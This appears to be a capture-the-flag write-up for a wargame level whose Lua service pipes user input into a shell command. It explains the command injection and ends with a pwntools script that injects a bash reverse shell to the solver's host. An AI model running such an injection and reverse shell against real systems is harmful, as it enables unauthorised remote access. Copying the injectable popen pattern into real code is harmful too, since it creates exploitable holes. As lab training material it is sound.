# level 12

## Discription

> There is a backdoor process listening on port 50001. \
\
> To do this level, log in as the level12 account with the password level12. Files for this level can be found in /home/flag12.

## Source Code

```lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 50001))

function hash(password)
  prog = io.popen("echo "..password.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local line, err = client:receive()
  if not err then
      print("trying " .. line) -- log from where ;\
      local h = hash(line)

      if h ~= "4754a4f4bd5787accd33de887b9250a0691dd198" then
          client:send("Better luck next time\n");
      else
          client:send("Congrats, your token is 413**CARRIER LOST**\n")
      end

  end

  client:close()
end
```

## Solution

This challenge was pretty simple, program is listening on port 50001.

```lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 50001))
```

If a client connects, it asks for password and then pass the user input to hash function.

```lua
while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local line, err = client:receive()
  if not err then
      print("trying " .. line) -- log from where ;\
      local h = hash(line)
```

Here is the vulnerable part of code, program echo user value to sha1sum command to get its hash and return the hash value to main function.

```lua
function hash(password)
  prog = io.popen("echo "..password.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end
```

And in the end it compares hash function returned value to `4754a4f4bd5787accd33de887b9250a0691dd198` and if it matches, it print out the token else it throws an error.

```lua
if h ~= "4754a4f4bd5787accd33de887b9250a0691dd198" then
    client:send("Better luck next time\n");
else
    client:send("Congrats, your token is 413**CARRIER LOST**\n")
end

end

client:close()
end
```

There are two ways to complete the level, first to create a [hash collision](https://privacycanada.net/hash-functions/hash-collision-attack/) to get the token printed, which is a time taking process. The other way is quite simple, we can do RCE as our input is directly sent to the shell to get the hash.

To execute our command in shell we can use [$()](https://unix.stackexchange.com/questions/147420/what-is-in-a-command) command substitution.

![](Images/solution.png)

## Python

```python
#!/usr/bin/python3

from pwn import *
from sys import argv,exit

if len(argv) < 3:
	sys.exit(f"{argv[0]} Target_IP Local_IP") 

level12 = ssh(host=argv[1],user='level12',password='level12')

remote_pro = level12.process(['nc','localhost','50001'])
local_pro = process(['nc','-l','4444'])
remote_pro.sendline(f'$(bash -i >& /dev/tcp/{argv[2]}/4444 0>&1)')
local_pro.sendline('getflag')
local_pro.interactive()
```
